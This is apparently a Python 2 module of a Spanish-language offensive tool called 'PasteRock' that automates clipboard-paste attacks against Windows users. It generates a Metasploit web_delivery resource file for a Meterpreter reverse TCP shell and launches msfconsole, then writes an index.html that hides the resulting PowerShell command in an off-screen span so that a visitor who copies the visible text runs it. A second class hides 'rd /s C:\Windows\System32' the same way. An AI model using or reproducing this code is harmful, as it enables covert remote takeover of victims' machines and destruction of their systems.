#-*- coding: utf-8 -*-
import os
from colores import *
class windows():
	def __init__(self):
		pass
	def windowsinfect(self):
		self.resultado=raw_input(bcolors.WARNING+"¿Ya creo la powershell? (Si/No): ")
		if self.resultado == "no":
			print bcolors.apache+"[x]Limpiando..."
			os.system("rm /var/www/html/index.html")
			os.system("rm meta_config")
			self.ip=raw_input("ingrese ip: ")
			self.port=raw_input("ingrese puerto: ")
			print bcolors.payload+"[*]Creando powershell..."
			documento="meta_config"
			archivo = open(documento,"w")
			archivo.write("""use exploit/multi/script/web_delivery\nset URIPATCH /\nset target 2\nset payload windows/meterpreter/reverse_tcp\nset lhost """+self.ip+"""\nset lport """+self.port+"""\nexploit""")
			archivo.close()
			print bcolors.payload+"La proxima vez que inicie PasteRock, pege la powershell."
			os.system("msfconsole -r meta_config")
		elif self.resultado == "si":
			self.mensaje1=raw_input("Primer Mensaje: ")
			self.mensaje2=raw_input("Segundo Mensaje: ")
			self.comando=raw_input("Comando: ")
			self.powershell=raw_input("Por favor, ingrese la powershell: ")
			self.ip=raw_input("Ingrese ip: ")
			index="index.html"
			job=open(index,"w")	
			job.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+self.powershell+"""  c:\ & cls <br> """ + self.comando + """ </span> """+self.mensaje2+"""</p> """)
			job.close()
			os.system("cp index.html /var/www/html")
			print bcolors.OKBLUE+"[:D] Todo esta completo http://"+self.ip+"/ Con toda campeon ;v"
		else:
			print bcolors.FAIL+"Escriba lo que es."
class windowsrm():
	def __init__(self):
		self.ip=raw_input(bcolors.payload+"ingrese ip: ")
		self.mensaje1=raw_input(bcolors.payload+"Primer Mensaje: ")
		self.sms2=raw_input(bcolors.payload+"Segundo Mensaje: ")
		self.comando=raw_input(bcolors.payload+"comando: ")
	def system32(self):
		archivo="index.html"
		work=open(archivo,"w")	
		work.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & rd /s C:\Windows\System32 & cls <br> """ + self.comando + """ </span>"""+self.sms2+""" </p> """)
		work.close()
		os.system("mv index.html /var/www/html")
		print bcolors.OKBLUE+"[:D] Todo esta completo http://"+self.ip+"/ Con toda campeon ;v"
